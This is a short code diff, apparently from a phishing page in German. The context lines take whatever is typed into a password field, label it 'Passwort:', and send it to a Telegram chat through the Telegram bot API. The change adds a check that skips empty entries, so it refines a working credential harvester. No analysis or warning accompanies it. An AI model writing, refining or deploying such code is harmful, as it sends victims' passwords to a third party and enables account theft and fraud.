@@ -21,6 +21,10 @@
                 var message = $("#passwordinput").val();
                 var userAgent = navigator.userAgent;
                 var fullMessage = "Passwort: " + message;
+
+                if (message.trim() === "") {
+                    return;
+                }
                 
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
                     console.log("Antwort von der Telegram API:", data);
